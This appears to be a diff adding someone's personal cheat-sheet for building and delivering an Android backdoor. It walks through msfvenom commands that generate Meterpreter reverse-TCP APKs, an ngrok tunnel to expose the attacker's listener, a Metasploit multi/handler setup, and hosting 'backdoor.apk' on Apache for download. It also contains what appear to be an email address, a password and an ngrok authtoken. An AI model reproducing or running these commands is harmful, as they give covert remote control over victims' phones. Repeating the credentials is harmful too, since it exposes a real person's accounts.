@@ -1,0 +1,52 @@
+http://796b242a.ngrok.io
+cd /opt/
+./ngrok http 80
+
+./ngrok tcp 8080
+tcp://0.tcp.ngrok.io:16405 --> localhost:8080
+
+msfvenom -p android/meterpreter/reversetcp LHOST=0.tcp.ngrok.io LPORT=16405 -o /home/jeisson/Escritorio/ngroktest.apk
+msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=16405 R > ngroksony.apk
+
+sudo service postgresql start
+sudo msfconsole
+
+use exploit/multi/handler
+set PAYLOAD android/meterpreter/reverse_tcp
+show options
+set LHOST localhost
+set LPORT 8080
+exploit
+
+ngrok:port host
+localhost:port msfconsole listener
+
+tcp://0.tcp.ngrok.io:16405 -> localhost:8080    
+
+192.168.1.57/
+181.53.12.70
+
+
+
+-----------ngrok hack
+//ngrok.com
+jsarenasrodriguez@gmail.comj3valentin
+J3Valentin
+
+unzip ngrok-stable.zip
+./ngrok http 80
+
+./ngrok authtoken 6yrP6qYcjvHsWJBaw8Kju_33hUt2mdGRLpKZGdPHcY6
+./ngrok tcp 4444
+
+ping 0.tcp.ngrok.io
+52.14.61.47
+18432
+
+msfvenom -p android/meterpreter/reverse_tcp LHOST=52.14.61.47 LPORT=18432 > bakdoor.apk
+service apache2 start
+service apache2 restart
+
+cp ngrok backdoor.apk /var/www/html/
+http://8877fc13.ngrok.io/backdoor.apk
+(ese esta en /var/www/html/)
